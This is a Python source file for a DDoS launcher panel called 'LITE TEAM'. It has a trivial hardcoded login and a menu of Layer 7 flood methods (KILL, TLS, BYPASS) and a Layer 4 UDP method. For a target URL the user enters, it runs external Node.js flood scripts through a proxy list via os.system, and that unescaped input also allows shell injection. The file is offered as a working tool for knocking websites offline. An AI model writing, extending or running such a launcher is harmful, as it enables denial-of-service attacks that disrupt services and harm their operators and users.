# -*- coding: utf-8 -*-
from operator import index
from colorama import Fore, Back, Style, init
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
import colorama
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs
import shutil
import time

terminal_size = shutil.get_terminal_size()
terminal_width = terminal_size.columns

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")
    
start_color = (255, 255, 255)
end_color = (0, 0, 255)

class Color:
    colorama.init()
def help():
	os.system('cls' if os.name == 'nt' else 'clear')
	print('\n'.join([line.center(terminal_width) for line in """\033[31m
╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗
║║║║╣  ║ ╠═╣║ ║ ║║╚═╗
╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝
   NAME         DESCRIPTION      DURATION
╔═══════════╬═══════════════════╬═══════════╗
║  KILL             LAYER7           120    ║
║  TLS              LAYER7           120    ║
║  BYPASS           LAYER7           120    ║
╔═══════════╬═══════════════════╬═══════════╗
║  UDP              LAYER4           120    ║
╚═══════════════════════════════════════════╝
 Usage : [methods] [target]
\033[0m

  

                    
""".strip().splitlines()]))

def main(username):
	os.system('cls' if os.name == 'nt' else 'clear')
	print('\n'.join([line.center(terminal_width) for line in """
	\033[31m
⣿⡟⠙⠛⠋⠩⠭⣉⡛⢛⠫⠭⠄⠒⠄⠄⠄⠈⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⡇⠄⠄⠄⠄⣠⠖⠋⣀⡤⠄⠒⠄⠄⠄⠄⠄⠄⠄⠄⠄⣈⡭⠭⠄⠄⠄⠉⠙
⣿⡇⠄⠄⢀⣞⣡⠴⠚⠁⠄⠄⢀⠠⠄⠄⠄⠄⠄⠄⠄⠉⠄⠄⠄⠄⠄⠄⠄⠄
⣿⡇⠄⡴⠁⡜⣵⢗⢀⠄⢠⡔⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
⣿⡇⡜⠄⡜⠄⠄⠄⠉⣠⠋⠠⠄⢀⡄⠄⠄⣠⣆⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸
⣿⠸⠄⡼⠄⠄⠄⠄⢰⠁⠄⠄⠄⠈⣀⣠⣬⣭⣛⠄⠁⠄⡄⠄⠄⠄⠄⠄⢀⣿
⣏⠄⢀⠁⠄⠄⠄⠄⠇⢀⣠⣴⣶⣿⣿⣿⣿⣿⣿⡇⠄⠄⡇⠄⠄⠄⠄⢀⣾⣿
⣿⣸⠈⠄⠄⠰⠾⠴⢾⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⢁⣾⢀⠁⠄⠄⠄⢠⢸⣿⣿
⣿⣿⣆⠄⠆⠄⣦⣶⣦⣌⣿⣿⣿⣿⣷⣋⣀⣈⠙⠛⡛⠌⠄⠄⠄⠄⢸⢸⣿⣿
⣿⣿⣿⠄⠄⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠈⠄⠄⠄⠄⠄⠈⢸⣿⣿
⣿⣿⣿⠄⠄⠄⠘⣿⣿⣿⡆⢀⣈⣉⢉⣿⣿⣯⣄⡄⠄⠄⠄⠄⠄⠄⠄⠈⣿⣿
⣿⣿⡟⡜⠄⠄⠄⠄⠙⠿⣿⣧⣽⣍⣾⣿⠿⠛⠁⠄⠄⠄⠄⠄⠄⠄⠄⠃⢿⣿
⣿⡿⠰⠄⠄⠄⠄⠄⠄⠄⠄⠈⠉⠩⠔⠒⠉⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠐⠘⣿
⣿⠃⠃⠄⠄⠄⠄⠄⠄⣀⢀⠄⠄⡀⡀⢀⣤⣴⣤⣤⣀⣀⠄⠄⠄⠄⠄⠄⠁⢹

PLESE TYPE "menu" TO SEE ALL THE METHODS
\033[0m""".strip().splitlines()]))

	while True:
		sin = input(f"""\033[41m\033[30mroot • LITE TEAM\033[0m ➤ \033[0m""")
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			main(username)
		if sinput == "cls" or sinput == "CLS":
			os.system ("clear")
			main(username)
		if sinput == "help" or sinput == "HELP" or sinput == ".help" or sinput == ".HELP" or sinput == "menu" or sinput == ".menu" or sinput == "MENU" or sinput == ".MENU":
			help()



#method untuk layer 7 :)

		elif sinput == "KILL" or sinput == "kill":
			try:
				url = sin.split()[1]
				#time = sin.split()[2]
				#rp = sin.split()[3]
				#th = sin.split()[4]
				os.system(f'cd LOL && node KILL.js {url} 120 64 10 proxy.txt')
				
			except ValueError:
				main(username)
			except IndexError:
				main(username)
		
				
		elif sinput == "BYPASS" or sinput == "bypass":
			try:
				url = sin.split()[1]
				#time = sin.split()[2]
				#rp = sin.split()[3]
				#th = sin.split()[4]
				os.system(f'cd LOL && node BYPASS.js {url} 120 64 10 proxy.txt')
			except ValueError:
				main(username)
			except IndexError:
				main(username)
				
		elif sinput == "TLS" or sinput == "tls":
			try:
				url = sin.split()[1]
				#time = sin.split()[2]
				#rp = sin.split()[3]
				#th = sin.split()[4]
				os.system(f'cd LOL && node TLS.js {url} 120 64 10')
				#os.system ("clear")
			except ValueError:
				main(username)
			except IndexError:
				main(username)
				
#method untuk layer 4 :)

#comingsoon :)


#HALAMAN UNTUK LOGIN :)
def login():
	sys.stdout.write(f"\x1b]2;[\] LITE TEAM :: Online Users: [1] :: BOT ON : [7529]\x07")
	os.system('cls' if os.name == 'nt' else 'clear')
	print('\n'.join([line.center(terminal_width) for line in """\033[31m
⣿⡟⠙⠛⠋⠩⠭⣉⡛⢛⠫⠭⠄⠒⠄⠄⠄⠈⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⡇⠄⠄⠄⠄⣠⠖⠋⣀⡤⠄⠒⠄⠄⠄⠄⠄⠄⠄⠄⠄⣈⡭⠭⠄⠄⠄⠉⠙
⣿⡇⠄⠄⢀⣞⣡⠴⠚⠁⠄⠄⢀⠠⠄⠄⠄⠄⠄⠄⠄⠉⠄⠄⠄⠄⠄⠄⠄⠄
⣿⡇⠄⡴⠁⡜⣵⢗⢀⠄⢠⡔⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
⣿⡇⡜⠄⡜⠄⠄⠄⠉⣠⠋⠠⠄⢀⡄⠄⠄⣠⣆⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸
⣿⠸⠄⡼⠄⠄⠄⠄⢰⠁⠄⠄⠄⠈⣀⣠⣬⣭⣛⠄⠁⠄⡄⠄⠄⠄⠄⠄⢀⣿
⣏⠄⢀⠁⠄⠄⠄⠄⠇⢀⣠⣴⣶⣿⣿⣿⣿⣿⣿⡇⠄⠄⡇⠄⠄⠄⠄⢀⣾⣿
⣿⣸⠈⠄⠄⠰⠾⠴⢾⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⢁⣾⢀⠁⠄⠄⠄⢠⢸⣿⣿
⣿⣿⣆⠄⠆⠄⣦⣶⣦⣌⣿⣿⣿⣿⣷⣋⣀⣈⠙⠛⡛⠌⠄⠄⠄⠄⢸⢸⣿⣿
⣿⣿⣿⠄⠄⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠈⠄⠄⠄⠄⠄⠈⢸⣿⣿
⣿⣿⣿⠄⠄⠄⠘⣿⣿⣿⡆⢀⣈⣉⢉⣿⣿⣯⣄⡄⠄⠄⠄⠄⠄⠄⠄⠈⣿⣿
⣿⣿⡟⡜⠄⠄⠄⠄⠙⠿⣿⣧⣽⣍⣾⣿⠿⠛⠁⠄⠄⠄⠄⠄⠄⠄⠄⠃⢿⣿
⣿⡿⠰⠄⠄⠄⠄⠄⠄⠄⠄⠈⠉⠩⠔⠒⠉⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠐⠘⣿
⣿⠃⠃⠄⠄⠄⠄⠄⠄⣀⢀⠄⠄⡀⡀⢀⣤⣴⣤⣤⣀⣀⠄⠄⠄⠄⠄⠄⠁⢹
	\033[0m""".strip().splitlines()]))
	user = "1"
	passwd = "1"
	username = input("""\033[31m
[USERNAME]~# """)
	password = getpass.getpass(prompt='[PASSWORD]~# ')
	if username != user or password != passwd:
		print("")
		sys.exit(1)
	elif username == user and password == passwd:
		print("\033[31mSuccessfully Login to ur Account")
		time.sleep(1)
		main(username)
if __name__ == "__main__":
    login()